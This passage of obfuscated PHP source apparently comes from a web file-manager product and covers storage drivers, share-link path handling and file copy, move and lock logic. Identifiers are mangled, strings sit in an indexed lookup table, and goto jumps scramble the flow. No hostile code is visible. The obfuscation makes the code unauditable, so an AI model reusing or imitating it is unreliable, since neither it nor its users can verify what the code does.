!class_exists($“—“•Î)) { if ($òé«Œ“) { return LNG($©ä…Èˆè[2154]); } write_log(array($©ä…Èˆè[2155], $ãî¸„Æá, get_caller_info()), $©ä…Èˆè[2156]); show_json(LNG($©ä…Èˆè[2154]), !1, $ãî¸„Æá); } $‹Ì¬İ¹š = new $“—“•Î($½è©ìúº); if (in_array($Š°„¶×Â, $‹Ì¬İ¹š->objectDriver)) { if (!$‹Ì¬İ¹š->isBucketCors() && !$‹Ì¬İ¹š->setBucketCors()) { $è°¹ÙÏİ = LNG($©ä…Èˆè[2157]); $è°¹ÙÏİ .= $©ä…Èˆè[2158] . LNG($©ä…Èˆè[2159]); if ($òé«Œ“) { return $è°¹ÙÏİ; } show_json($è°¹ÙÏİ, !1); } } $¹ËîÕ¯• = rtrim($½è©ìúº[$©ä…Èˆè[1187]], $©ä…Èˆè[8]) . $©ä…Èˆè[8]; $ó¥éÂ®³ = $‹Ì¬İ¹š->getPath($¹ËîÕ¯• . $©ä…Èˆè[1249]); if (!$‹Ì¬İ¹š->mkfile($ó¥éÂ®³)) { if ($òé«Œ“) { return LNG($©ä…Èˆè[2157]); } show_json(LNG($©ä…Èˆè[2157]), !1); } $½è©ìúº[$©ä…Èˆè[1187]] = $¹ËîÕ¯•; $ãî¸„Æá[$©ä…Èˆè[6]] = json_encode($½è©ìúº); $ãî¸„Æá[$©ä…Èˆè[95]] = $“İıï›Û; return !0; } public function driverListSystem() { $ô˜Éá =& $_SERVER[ Ö‘ñÄ”]; $úÒÄÛ§· = parent::listData(); $ı·ë’š€ = array(); foreach ($úÒÄÛ§· as $åå…ËÚ®) { unset($åå…ËÚ®[$ô˜Éá[200]], $åå…ËÚ®[$ô˜Éá[85]]); $åå…ËÚ®[$ô˜Éá[6]] = json_decode($åå…ËÚ®[$ô˜Éá[6]], !0); $ı·ë’š€[] = $åå…ËÚ®; } return $ı·ë’š€; } public function defaultDriver() { $ªÊâˆƒø =& $_SERVER[ Ö‘ñÄ”]; $ê‹ĞÅ‹ò = parent::listData(); $ùœ¢Ú‹¼ = array_filter_by_field($ê‹ĞÅ‹ò, $ªÊâˆƒø[37], 1); $ùœ¢Ú‹¼ = $ùœ¢Ú‹¼[0]; if ($ùœ¢Ú‹¼) { $ùœ¢Ú‹¼[$ªÊâˆƒø[6]] = json_decode($ùœ¢Ú‹¼[$ªÊâˆƒø[6]], !0); } return $ùœ¢Ú‹¼; } public function driverInfo($¡ü±„·) { $»ößËŠæ =& $_SERVER[ Ö‘ñÄ”]; $¹ï££Á• = array_to_keyvalue(parent::listData(), $»ößËŠæ[407]); if (!isset($¹ï££Á•[$¡ü±„·])) { return !1; } $øıœÔ­Í = $¹ï££Á•[$¡ü±„·]; $øıœÔ­Í[$»ößËŠæ[6]] = json_decode($øıœÔ­Í[$»ößËŠæ[6]], !0); return $øıœÔ­Í; } public function remove($ä§éÆ§‰) { $this->removeShareItems($ä§éÆ§‰); return parent::remove($ä§éÆ§‰); } public function removeWithFile($¼ÈÛÕ—, $ŒÎ÷Ñ¡) { $Îì°”°Ã =& $_SERVER[ Ö‘ñÄ”]; $¹“×”Øë = array($Îì°”°Ã[830] => $¼ÈÛÕ—); $¦ŠäÆÊ• = Model($Îì°”°Ã[479])->where($¹“×”Øë)->count(); $öÇ¦› å = Model($Îì°”°Ã[479])->where($¹“×”Øë)->sum($Îì°”°Ã[76]); $´œ¹ÄÓ¬ = $ŒÎ÷Ñ¡ . $Îì°”°Ã[2160] . $¼ÈÛÕ—; $Ñ‘Ş¯‹´ = LNG($ŒÎ÷Ñ¡ == $Îì°”°Ã[565] ? $Îì°”°Ã[2161] : $Îì°”°Ã[2162]); $Ô”˜Àì = new TaskFileTransfer($´œ¹ÄÓ¬, $Îì°”°Ã[2156], $¦ŠäÆÊ•, $Ñ‘Ş¯‹´ . "\x28{$¼ÈÛÕ—}\51"); $Ô”˜Àì->task[$Îì°”°Ã[776]] = (double) $öÇ¦› å; $å¾é›Ñ = KodIO::defaultDriver(); $³­ÆƒŠÔ = $å¾é›Ñ[$Îì°”°Ã[407]]; $úÀàæôÜ = "\173\151\x6f\x3a{$³­ÆƒŠÔ}\x7d\57"; $Œï·Ü‡ = !0; $ë¿™¶éï = array(); $†·¢®ë† = Model($Îì°”°Ã[199])->where($¹“×”Øë)->field($Îì°”°Ã[2163])->select(); foreach ($†·¢®ë† as $çãÈ¿™Ş) { $¸“ŸÉø = $çãÈ¿™Ş[$Îì°”°Ã[84]]; $Ì»¹Î»ƒ = $úÀàæôÜ . str_replace("\173\151\x6f\72{$¼ÈÛÕ—}\175\x2f", $Îì°”°Ã[12], $¸“ŸÉø); if (!IO::exist($¸“ŸÉø)) { $ë¿™¶éï[] = $çãÈ¿™Ş[$Îì°”°Ã[476]]; $Ô”˜Àì->updateFileEnd($çãÈ¿™Ş[$Îì°”°Ã[32]], $çãÈ¿™Ş[$Îì°”°Ã[76]]); continue; } if (IO::exist($Ì»¹Î»ƒ)) { $Ô”˜Àì->updateFileEnd($çãÈ¿™Ş[$Îì°”°Ã[32]], $çãÈ¿™Ş[$Îì°”°Ã[76]]); continue; } if (!IO::move($¸“ŸÉø, get_path_father($Ì»¹Î»ƒ))) { $Œï·Ü‡ = !1; break; } $¹“×”Øë = array($Îì°”°Ã[476] => $çãÈ¿™Ş[$Îì°”°Ã[476]]); $ÊœÁëØó = array($Îì°”°Ã[830] => $³­ÆƒŠÔ, $Îì°”°Ã[84] => $Ì»¹Î»ƒ); Model($Îì°”°Ã[199])->where($¹“×”Øë)->save($ÊœÁëØó); } $this->removeByFileID($ë¿™¶éï); if (!$Œï·Ü‡) { $Ô”˜Àì->stop($´œ¹ÄÓ¬); return !1; } $Ô”˜Àì->end(); if ($ŒÎ÷Ñ¡ == $Îì°”°Ã[1805]) { $this->remove($¼ÈÛÕ—); } } public function progress($Ÿî£‘¦ã, $ÇÔ€Ä•í) { return Task::get($ÇÔ€Ä•í . $_SERVER[ Ö‘ñÄ”][2160] . $Ÿî£‘¦ã); } private function removeByFileID($â‹Çá›ä = array()) { $¤¶Ğš‚Ç =& $_SERVER[ Ö‘ñÄ”]; if (empty($â‹Çá›ä)) { return; } $Õ‚ ‡çö = array($¤¶Ğš‚Ç[476] => array($¤¶Ğš‚Ç[7], $â‹Çá›ä)); $ĞŒ­Ë‘„ = Model($¤¶Ğš‚Ç[1333])->where($Õ‚ ‡çö)->field($¤¶Ğš‚Ç[410])->select(); if (!$ĞŒ­Ë‘„) { return; } $ĞŒ­Ë‘„ = array_to_keyvalue($ĞŒ­Ë‘„, $¤¶Ğš‚Ç[12], $¤¶Ğš‚Ç[410]); foreach ($ĞŒ­Ë‘„ as $™ß¯×Óú) { Model($¤¶Ğš‚Ç[424])->removeNow($™ß¯×Óú, !1); } } private function removeShareItems($ÀÄå÷ˆû) { $ı…Û²¯Ù =& $_SERVER[ Ö‘ñÄ”]; $¹ŒÁëÃ¸ = "\173\x69\157\72{$ÀÄå÷ˆû}\x7d\57"; $±¬Çêú¤ = array($ı…Û²¯Ù[410] => 0, $ı…Û²¯Ù[1182] => array($ı…Û²¯Ù[391], "{$¹ŒÁëÃ¸}\45")); $ÉÙå÷Ç• = Model($ı…Û²¯Ù[1816])->where($±¬Çêú¤)->field($ı…Û²¯Ù[497])->select(); if (empty($ÉÙå÷Ç•)) { return; } $Á°ÜÄÙ = array_to_keyvalue($ÉÙå÷Ç•, $ı…Û²¯Ù[12], $ı…Û²¯Ù[497]); Model($ı…Û²¯Ù[609])->remove($Á°ÜÄÙ); } } goto câ×Öè£âó; cï™ËÆö: class PathDriverDriverShareItem { public function __construct($ÓôÖÇşå) { $this->pathParse = $ÓôÖÇşå; } public function __call($Ï¶ÀéûŸ, $î †šã²) { $“‚ñ‘µè =& $_SERVER[ Ö‘ñÄ”]; if (method_exists($this, $Ï¶ÀéûŸ)) { return; } $Òğ Ü†¸ = call_user_func_array(array($“‚ñ‘µè[1343], $Ï¶ÀéûŸ), $î †šã²); $ôÇıì°‹ = array($“‚ñ‘µè[1344], $“‚ñ‘µè[1345], $“‚ñ‘µè[1346], $“‚ñ‘µè[1347], $“‚ñ‘µè[563], $“‚ñ‘µè[565], $“‚ñ‘µè[1348], $“‚ñ‘µè[107], $“‚ñ‘µè[1349], $“‚ñ‘µè[1350]); if (in_array($Ï¶ÀéûŸ, $ôÇıì°‹)) { $Òğ Ü†¸ = $this->getPathOuter($Òğ Ü†¸); } return $Òğ Ü†¸; } public function copy($‘õÀÌ³Æ, $Ö›À—†¶, $€š“Ÿ‡ù = false, $Ğ‹àíËè = false) { return $this->copyMove($‘õÀÌ³Æ, $Ö›À—†¶, $€š“Ÿ‡ù, $_SERVER[ Ö‘ñÄ”][563], $Ğ‹àíËè); } public function move($ó´ŠÛĞ, $æšàìÛÔ, $·¯´££ = false, $ì³“ó› = false) { return $this->copyMove($ó´ŠÛĞ, $æšàìÛÔ, $·¯´££, $_SERVER[ Ö‘ñÄ”][565], $ì³“ó›); } private function copyMove($È ˜‹´®, $½©ŒØ²Ê, $œŸĞë‘, $›ô‡‹õÔ, $¬øÉÁšî = false) { $ªØ•’û =& $_SERVER[ Ö‘ñÄ”]; $å¦ù¦áá = $½©ŒØ²Ê; $¢©«Öç² = IO::driverMake($½©ŒØ²Ê); if ($¢©«Öç²->pathParse[$ªØ•’û[1157]]) { $½©ŒØ²Ê = $¢©«Öç²->pathParse[$ªØ•’û[1157]]; } else { $½©ŒØ²Ê = $å¦ù¦áá; } $„òÎé°Ÿ = IO::copyMove($È ˜‹´®, $½©ŒØ²Ê, $œŸĞë‘, $›ô‡‹õÔ, $¬øÉÁšî); $„òÎé°Ÿ = $this->getPathOuter($„òÎé°Ÿ); return $„òÎé°Ÿ; } public function pathThis($¨õ¼‘èİ) { return get_path_this($this->pathParse[$_SERVER[ Ö‘ñÄ”][84]]); } public function pathFather($ª›¶ÎµÏ) { return get_path_father($this->pathParse[$_SERVER[ Ö‘ñÄ”][84]]); } public function iconvSystem($û²î›£š) { return $û²î›£š; } protected function infoParse($‘ÒÊ±Ëì, $›…¹Ê×Ç = false) { $ˆâ†Åï§ =& $_SERVER[ Ö‘ñÄ”]; $ÈÊÜÀ˜¹ = $this->pathParse[$ˆâ†Åï§[495]][$ˆâ†Åï§[1182]] . $this->pathParse[$ˆâ†Åï§[1175]]; if ($›…¹Ê×Ç) { $Ş§¾¬­Ã = IO::infoWithChildren($ÈÊÜÀ˜¹); } else { $Ş§¾¬­Ã = IO::info($ÈÊÜÀ˜¹); } $œ„¡ñ‰æ = $this->pathParse[$ˆâ†Åï§[495]]; return Action($ˆâ†Åï§[1341])->_shareItemeParse($Ş§¾¬­Ã, $œ„¡ñ‰æ); } public function listAll($²›–É’‰) { $¯‰é£Ùß =& $_SERVER[ Ö‘ñÄ”]; $ñ £é€º = IO::listAll($²›–É’‰); $©‡­Ê‘ = $this->pathParse[$¯‰é£Ùß[495]]; foreach ($ñ £é€º as &$ìç¼ ŞÇ) { check_abort(); $”å¢†³ = IO::info($ìç¼ ŞÇ[$¯‰é£Ùß[84]]); $”å¢†³ = is_array($”å¢†³) ? $”å¢†³ : array(); $ìç¼ ŞÇ = array_merge($”å¢†³, $ìç¼ ŞÇ); $ìç¼ ŞÇ[$¯‰é£Ùß[86]] = Action($¯‰é£Ùß[1341])->_shareItemeParse($ìç¼ ŞÇ, $©‡­Ê‘); } unset($ìç¼ ŞÇ); return $ñ £é€º; } public function getPathOuter($„ÉÔ×€) { $ËÚÀ·È› =& $_SERVER[ Ö‘ñÄ”]; $¢µĞí™® = KodIO::parse($„ÉÔ×€); if ($¢µĞí™®[$ËÚÀ·È›[33]] == KodIO::KOD_SHARE_ITEM) { return $¢µĞí™®[$ËÚÀ·È›[84]]; } $à”ÕÁ» = KodIO::clear($„ÉÔ×€); $áú³³¢Õ = KodIO::clear($this->pathParse[$ËÚÀ·È›[495]][$ËÚÀ·È›[1182]]); $áĞº§À = substr($à”ÕÁ», strlen($áú³³¢Õ)); if (substr($à”ÕÁ», 0, strlen($áú³³¢Õ)) != $áú³³¢Õ) { return !1; } return $this->pathParse[$ËÚÀ·È›[1176]] . $ËÚÀ·È›[8] . ltrim($áĞº§À, $ËÚÀ·È›[8]); } public function getType() { $İã¹ºÚÎ =& $_SERVER[ Ö‘ñÄ”]; $‘§• = str_replace($İã¹ºÚÎ[74], $İã¹ºÚÎ[12], get_class($this)); return strtolower($‘§•); } public function isTypeObject($öàäåç©) { return IO::isTypeObject($öàäåç©); } public function info($é Ğû”¾) { return $this->infoParse($é Ğû”¾); } public function infoAuth($Ô—Áğ¨î) { return $this->infoParse($Ô—Áğ¨î); } public function infoWithChildren($ä«´Ğ¶á) { return $this->infoParse($ä«´Ğ¶á, !0); } public function infoFull($Ğ‚™ÓáÁ) { return $this->infoParse($Ğ‚™ÓáÁ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($·•Ü’êˆ) { $this->pathParse = $·•Ü’êˆ; } protected function infoParse($Ï¸²ü²Á, $ëØÏê€ï = false) { $ú·å·á› =& $_SERVER[ Ö‘ñÄ”]; return Action($ú·å·á›[1181])->sharePathInfo($this->pathParse[$ú·å·á›[84]], !0, $ëØÏê€ï); } public function listPath($ÚÈÒ‘ñ‘, $¶Ÿ³¶ş¶ = false) { $Û•á†Ö€ =& $_SERVER[ Ö‘ñÄ”]; $››İÁ× = IO::listPath($ÚÈÒ‘ñ‘, $¶Ÿ³¶ş¶); if (!$››İÁ×) { return $››İÁ×; } if (is_array($››İÁ×[$Û•á†Ö€[1342]])) { $šÉŒ„ä­ = Action($Û•á†Ö€[1351])->parsePathChildren($››İÁ×[$Û•á†Ö€[1342]], array($Û•á†Ö€[429] => $ÚÈÒ‘ñ‘)); $››İÁ×[$Û•á†Ö€[1342]] = Action($Û•á†Ö€[1181])->shareItemInfo($šÉŒ„ä­); } foreach ($››İÁ× as $ØŒ¢ïØÁ => $Ñ•úÖÃÎ) { if (!in_array($ØŒ¢ïØÁ, array($Û•á†Ö€[83], $Û•á†Ö€[82]))) { continue; } foreach ($Ñ•úÖÃÎ as $Ê™¸šĞ× => $šÉŒ„ä­) { $šÉŒ„ä­ = Action($Û•á†Ö€[1351])->parsePathChildren($šÉŒ„ä­, array($Û•á†Ö€[429] => $ÚÈÒ‘ñ‘)); $››İÁ×[$ØŒ¢ïØÁ][$Ê™¸šĞ×] = Action($Û•á†Ö€[1181])->shareItemInfo($šÉŒ„ä­); } } return $››İÁ×; } public function listAll($Ñğ‚šüú) { $Øü˜ æ” =& $_SERVER[ Ö‘ñÄ”]; $ĞÙñ‰®‡ = IO::listAll($Ñğ‚šüú); foreach ($ĞÙñ‰®‡ as &$¼ØŸµ§í) { $‚ÕÒŒÄ = IO::info($¼ØŸµ§í[$Øü˜ æ”[84]]); $‚ÕÒŒÄ = is_array($‚ÕÒŒÄ) ? $‚ÕÒŒÄ : array(); $¼ØŸµ§í = array_merge($‚ÕÒŒÄ, $¼ØŸµ§í); $¼ØŸµ§í[$Øü˜ æ”[86]] = Action($Øü˜ æ”[1181])->shareItemInfo($¼ØŸµ§í); } unset($¼ØŸµ§í); return $ĞÙñ‰®‡; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($øµ²ß¥Õ) { parent::__construct($øµ²ß¥Õ); } } goto DÌ†ÖÀÆ½Ã; eå™ƒå°Æ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Õó±›‡Ò) { $ÒËœñÆ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÒËœñÆ[563], $Õó±›‡Ò); $±‰‘Ü“‘ = 1; $this->_lockEvent($Õó±›‡Ò, array($ÒËœñÆ[564], $ÒËœñÆ[565]), $±‰‘Ü“‘); $this->_lockParent($Õó±›‡Ò, array($ÒËœñÆ[565]), $±‰‘Ü“‘); $this->_lockEvent($Õó±›‡Ò, array($ÒËœñÆ[566], $ÒËœñÆ[567]), $±‰‘Ü“‘); $this->_lockCheckEnd($ÒËœñÆ[563], $Õó±›‡Ò); } public function lockCopyEnd($Å»–»Šì) { $¨ÑÆêËò =& $_SERVER[ Ö‘ñÄ”]; if (!$this->allowLock()) { return; } $ıéòÏ = 0; $this->_lockEvent($Å»–»Šì, array($¨ÑÆêËò[564], $¨ÑÆêËò[565]), $ıéòÏ); $this->_lockParent($Å»–»Šì, array($¨ÑÆêËò[565]), $ıéòÏ); $this->_lockEvent($Å»–»Šì, array($¨ÑÆêËò[566], $¨ÑÆêËò[567]), $ıéòÏ); } public function lockWriteStart($¸‹Ù˜°ş, $âŸš‘ë¢ = '') { $úšÜµæÄ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->allowLock()) { return; } $this->_lockCheck($úšÜµæÄ[564], $¸‹Ù˜°ş); $™ÚÇÊ = 1; $this->_lockKey($úšÜµæÄ[568] . $¸‹Ù˜°ş . $úšÜµæÄ[10] . $âŸš‘ë¢, $™ÚÇÊ); $this->_lockEvent($¸‹Ù˜°ş, array($úšÜµæÄ[563], $úšÜµæÄ[565]), $™ÚÇÊ); $this->_lockParent($¸‹Ù˜°ş, array($úšÜµæÄ[563], $úšÜµæÄ[565]), $™ÚÇÊ); $this->_lockCheckEnd($úšÜµæÄ[564], $¸‹Ù˜°ş); } public function lockWriteEnd($’æÅ°£…, $‘É÷‚¢ı = '') { $ç®äûÒ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->allowLock()) { return; } $¯ŒĞ‘Ø = 0; $this->_lockKey($ç®äûÒ[568] . $’æÅ°£… . $ç®äûÒ[10] . $‘É÷‚¢ı, $¯ŒĞ‘Ø); $this->_lockEvent($’æÅ°£…, array($ç®äûÒ[563], $ç®äûÒ[565]), $¯ŒĞ‘Ø); $this->_lockParent($’æÅ°£…, array($ç®äûÒ[563], $ç®äûÒ[565]), $¯ŒĞ‘Ø); } public function lockMoveStart($òŸŠ›±) { $ÉõºõòÅ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÉõºõòÅ[565], $òŸŠ›±); $ı‹­¶ºï = 1; $this->_lockKey($ÉõºõòÅ[569] . $òŸŠ›±, $ı‹­¶ºï); $this->_lockEvent($òŸŠ›±, array($ÉõºõòÅ[563], $ÉõºõòÅ[564]), $ı‹­¶ºï); $this->_lockParent($òŸŠ›±, array($ÉõºõòÅ[563], $ÉõºõòÅ[565]), $ı‹­¶ºï); $this->_lockEvent($òŸŠ›±, array($ÉõºõòÅ[570], $ÉõºõòÅ[566], $ÉõºõòÅ[567]), $ı‹­¶ºï); $this->_lockCheckEnd($ÉõºõòÅ[565], $òŸŠ›±); } public function lockMoveEnd($àèËÄğá) { $¿“Í±¸ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->allowLock()) { return; } $ŞüîÍ§œ = 0; $this->_lockKey($¿“Í±¸[569] . $àèËÄğá, $ŞüîÍ§œ); $this->_lockEvent($àèËÄğá, array($¿“Í±¸[563], $¿“Í±¸[564]), $ŞüîÍ§œ); $this->_lockParent($àèËÄğá, array($¿“Í±¸[563], $¿“Í±¸[565]), $ŞüîÍ§œ); $this->_lockEvent($àèËÄğá, array($¿“Í±¸[570], $¿“Í±¸[566], $¿“Í±¸[567]), $ŞüîÍ§œ); } private function _lockCheck($¤²®„½, $Éã…¦¦) { $Şß°’Ê =& $_SERVER[ Ö‘ñÄ”]; $•…ä‹®ó = $this->sourceInfo($Éã…¦¦); $™å¾İ…¬ = $¤²®„½ . $Şß°’Ê[10] . $Éã…¦¦; $this->_lockTimeStart[$™å¾İ…¬] = timeFloat(); if (!is_array($•…ä‹®ó)) { return; } $ğ¯¾æ¡“ = LNG($Şß°’Ê[571]); CacheLock::setErrorMsg($Şß°’Ê[162] . htmlspecialchars($•…ä‹®ó[$Şß°’Ê[32]]) . $Şß°’Ê[164] . $ğ¯¾æ¡“); $this->_lockKey($™å¾İ…¬, 1); $this->_lockKey($™å¾İ…¬, 0); $‡ó Ââø = array_reverse($this->parentLevelArray($•…ä‹®ó[$Şß°’Ê[529]])); foreach ($‡ó Ââø as $ÙúÑĞæ²) { $™å¾İ…¬ = $¤²®„½ . $Şß°’Ê[572] . $ÙúÑĞæ²; if (CacheLock::lockGet($Şß°’Ê[573] . $™å¾İ…¬)) { $•…ä‹®ó = $this->sourceInfo($ÙúÑĞæ²); CacheLock::setErrorMsg($Şß°’Ê[162] . htmlspecialchars($•…ä‹®ó[$Şß°’Ê[32]]) . $Şß°’Ê[164] . $ğ¯¾æ¡“); $this->_lockKey($™å¾İ…¬, 1); $this->_lockKey($™å¾İ…¬, 0); } } } private function _lockCheckEnd($ûØËÜ”š, $ëùö—üÇ) { $–ÎŠìÉœ =& $_SERVER[ Ö‘ñÄ”]; $¯Ó°Ş†¦ = $ûØËÜ”š . $–ÎŠìÉœ[10] . $ëùö—üÇ; CacheLock::setErrorMsg($–ÎŠìÉœ[246]); if (!isset($this->_lockTimeStart[$¯Ó°Ş†¦])) { return; } $ÎªÀ¼ü÷ = timeFloat() - $this->_lockTimeStart[$¯Ó°Ş†¦]; unset($this->_lockTimeStart[$¯Ó°Ş†¦]); if ($ÎªÀ¼ü÷ > 0.5) { unset(self::$cacheSourceInfo[$–ÎŠìÉœ[468] . $ëùö—üÇ]); } $¢ì¤êï = $this->sourceInfo($ëùö—üÇ); if (!$¢ì¤êï) { show_json(LNG($–ÎŠìÉœ[105]), !1); } } private function _lockParent($Àø—Á¯ç, $šŸàÚ€û, $œ¢¢‡İË) { if (!$this->autoLockSet) { return; } $‹Æ‘½š­ = $this->sourceInfo($Àø—Á¯ç); if (!is_array($‹Æ‘½š­)) { return; } $óçúÛ‡¦ = array_reverse($this->parentLevelArray($‹Æ‘½š­[$_SERVER[ Ö‘ñÄ”][529]])); foreach ($óçúÛ‡¦ as $ü¥§õÂ›) { $this->_lockEvent($ü¥§õÂ›, $šŸàÚ€û, $œ¢¢‡İË); } } private function _lockEvent($¥¢®¢ùñ, $Ÿ˜´ÂëÁ, $­ğ—”ğİ) { $ÆÖ²Ú =& $_SERVER[ Ö‘ñÄ”]; if (!$this->autoLockSet) { return; } foreach ($Ÿ˜´ÂëÁ as $ùºË½Ğº) { $ñÜíÑıÊ = $ùºË½Ğº . $ÆÖ²Ú[10] . $¥¢®¢ùñ; if ($­ğ—”ğİ && CacheLock::lockGet($ÆÖ²Ú[573] . $ñÜíÑıÊ)) { continue; } $this->_lockKey($ñÜíÑıÊ, $­ğ—”ğİ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Ã÷ü€¸ù, $Ğï½å¬Ã = 1) { $…İ—Åï = $_SERVER[ Ö‘ñÄ”][573] . md5($Ã÷ü€¸ù); if ($Ğï½å¬Ã) { if (isset(self::$_lockItemArr[$…İ—Åï])) { return; } self::$_lockItemArr[$…İ—Åï] = 1; CacheLock::lock($…İ—Åï, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$…İ—Åï])) { return; } unset(self::$_lockItemArr[$…İ—Åï]); CacheLock::unlock($…İ—Åï); } } public function isParentOf($”ôâà×, $šıİ“¶Ì) { $ÎĞæ€Îœ =& $_SERVER[ Ö‘ñÄ”]; $§ĞÖÛšì = $this->sourceInfo($”ôâà×); $Ç›© º§ = $this->sourceInfo($šıİ“¶Ì); $Ê¢’ÏÁ = $§ĞÖÛšì[$ÎĞæ€Îœ[529]] . $§ĞÖÛšì[$ÎĞæ€Îœ[410]] . $ÎĞæ€Îœ[50]; $¬ÆğÔÚÏ = $Ç›© º§[$ÎĞæ€Îœ[529]] . $Ç›© º§[$ÎĞæ€Îœ[410]] . $ÎĞæ€Îœ[50]; $Ì‘Óî’ã = strpos($¬ÆğÔÚÏ, $Ê¢’ÏÁ) === 0; return $Ì‘Óî’ã; } private $targetIsDelete = 0; public function copy($¸åœä¦Ÿ, $»øÒ¥Š—, $Ç²¤§¾¸ = REPEAT_REPLACE, $÷Ê§Œ = '') { $¬±ÃóÅ¸ =& $_SERVER[ Ö‘ñÄ”]; $èù£‡€½ = $this->sourceInfo($¸åœä¦Ÿ); $ı²“ßĞâ = $this->sourceInfo($»øÒ¥Š—); if (!$èù£‡€½ || !$ı²“ßĞâ || $ı²“ßĞâ[$¬±ÃóÅ¸[418]] != $¬±ÃóÅ¸[88]) { return !1; } if ($this->isParentOf($¸åœä¦Ÿ, $»øÒ¥Š—)) { return !1; } $¨ü—Š§Ü = $÷Ê§Œ ? $÷Ê§Œ : $èù£‡€½[$¬±ÃóÅ¸[32]]; $this->lockCopyStart($¸åœä¦Ÿ); $this->lockWriteStart($»øÒ¥Š—, $¨ü—Š§Ü); $ ›ëŞ±‚ = array($¬±ÃóÅ¸[574] => array(), $¬±ÃóÅ¸[575] => array(), $¬±ÃóÅ¸[576] => array()); $this->targetIsDelete = intval($èù£‡€½[$¬±ÃóÅ¸[439]]); $’à·Ñ¼È = $this->fileNameExistCache($»øÒ¥Š—, $èù£‡€½[$¬±ÃóÅ¸[32]]); $éşÒòÛ¶ = $this->_copy($¸åœä¦Ÿ, $»øÒ¥Š—, $Ç²¤§¾¸, $ ›ëŞ±‚, !0, $÷Ê§Œ); $this->_childrenListClear(); $this->lockCopyEnd($¸åœä¦Ÿ); $this->lockWriteEnd($»øÒ¥Š—, $¨ü—Š§Ü); if ($èù£‡€½[$¬±ÃóÅ¸[418]] == $¬±ÃóÅ¸[88] && $’à·Ñ¼È == $éşÒòÛ¶) { $this->folderSizeResetChildren($’à·Ñ¼È); } Model($¬±ÃóÅ¸[577])->addAll($ ›ëŞ±‚[$¬±ÃóÅ¸[575]], array(), !0); if ($’à·Ñ¼È != $éşÒòÛ¶ || $èù£‡€½[$¬±ÃóÅ¸[418]] == $¬±ÃóÅ¸[88]) { Model($¬±ÃóÅ¸[578])->eventCopy($éşÒòÛ¶); } $this->saveAll($ ›ëŞ±‚[$¬±ÃóÅ¸[576]]); Model($¬±ÃóÅ¸[199])->linkAdd($ ›ëŞ±‚[$¬±ÃóÅ¸[574]]); $this->folderSizeReset($»øÒ¥Š—); $this->updateModifyTime($»øÒ¥Š—); return $éşÒòÛ¶; } private function _copy($®°Îšşé, $Ó‰£±ˆ…, $•À±ç, &$ƒ®¯Üù¶, $‘²š‘Œå, $óÕ›®Õœ = '') { $êëË‘¡» =& $_SERVER[ Ö‘ñÄ”]; $˜«ÒÀø = $this->sourceInfoCache($®°Îšşé); $ÒùĞÓŸÓ = $˜«ÒÀø[$êëË‘¡»[418]] == $êëË‘¡»[88]; $ÄøŒ³ç = $óÕ›®Õœ ? $óÕ›®Õœ : $˜«ÒÀø[$êëË‘¡»[32]]; $½öÕå­ = $this->fileNameExistCache($Ó‰£±ˆ…, $ÄøŒ³ç); if ($‘²š‘Œå) { $this->_childrenAllMake($®°Îšşé); if ($ÒùĞÓŸÓ && $½öÕå­) { $this->_childrenAllMake($½öÕå­); } } if (!$½öÕå­) { return $this->_copyCreate($®°Îšşé, $Ó‰£±ˆ…, $ÄøŒ³ç, $ƒ®¯Üù¶); } $—¡œ‘©æ = $½öÕå­; if ($ÒùĞÓŸÓ) { if ($•À±ç == REPEAT_RENAME_FOLDER) { $ÄøŒ³ç = $this->fileNameAutoCache($Ó‰£±ˆ…, $ÄøŒ³ç, $•À±ç, $ÒùĞÓŸÓ); $—¡œ‘©æ = $this->_copyCreate($®°Îšşé, $Ó‰£±ˆ…, $ÄøŒ³ç, $ƒ®¯Üù¶); } else { $€×˜¦’Æ = $this->_childrenList($®°Îšşé); foreach ($€×˜¦’Æ as $êûß÷âç) { $this->_copy($êûß÷âç[$êëË‘¡»[410]], $½öÕå­, $•À±ç, $ƒ®¯Üù¶, !1); } } } else { if ($•À±ç == REPEAT_RENAME || $•À±ç == REPEAT_RENAME_FOLDER) { $ÄøŒ³ç = $this->fileNameAutoCache($Ó‰£±ˆ…, $ÄøŒ³ç, $•À±ç, $ÒùĞÓŸÓ); $—¡œ‘©æ = $this->_copyCreate($®°Îšşé, $Ó‰£±ˆ…, $ÄøŒ³ç, $ƒ®¯Üù¶); } else { if ($•À±ç == REPEAT_REPLACE) { $‰£Åà¿ = $this->sourceInfoCache($½öÕå­); $‡èœêˆƒ = $this->fileHistory($‰£Åà¿, $˜«ÒÀø[$êëË‘¡»[476]], $˜«ÒÀø[$êëË‘¡»[76]]); if ($‡èœêˆƒ) { $ƒ®¯Üù¶[$êëË‘¡»[574]][] = $˜«ÒÀø[$êëË‘¡»[476]]; } } else { if ($•À±ç == REPEAT_SKIP) { } } } Hook::trigger($êëË‘¡»[579], array($êëË‘¡»[580], $˜«ÒÀø, 0)); } return $—¡œ‘©æ; } private function _copyCreate($©——«à«, $ïØƒ”¯Â, $çª«­«ë, &$«¿â„ë¡) { $æ£ı„Â» =& $_SERVER[ Ö‘ñÄ”]; $ÒáÒõ–Ÿ = $this->sourceInfoCache($©——«à«); $¶¥«ÎÆ = $this->sourceInfoCache($ïØƒ”¯Â); $×ğ„Úû = $this->_makeItemData($ÒáÒõ–Ÿ, $¶¥«ÎÆ, $çª«­«ë); Hook::trigger($æ£ı„Â»[581], $×ğ„Úû); Hook::trigger($æ£ı„Â»[582], array($æ£ı„Â»[583], $×ğ„Úû, 0)); $ûÙäç¦ = $this->add($×ğ„Úû); $£÷«± = array($æ£ı„Â»[410] => $ûÙäç¦, $æ£ı„Â»[32] => $çª«­«ë); $this->_copyApplyMeta($£÷«±, $«¿â„ë¡); if ($ÒáÒõ–Ÿ[$æ£ı„Â»[418]] != $æ£ı„Â»[88]) { $«¿â„ë¡[$æ£ı„Â»[574]][] = $ÒáÒõ–Ÿ[$æ£ı„Â»[476]]; return 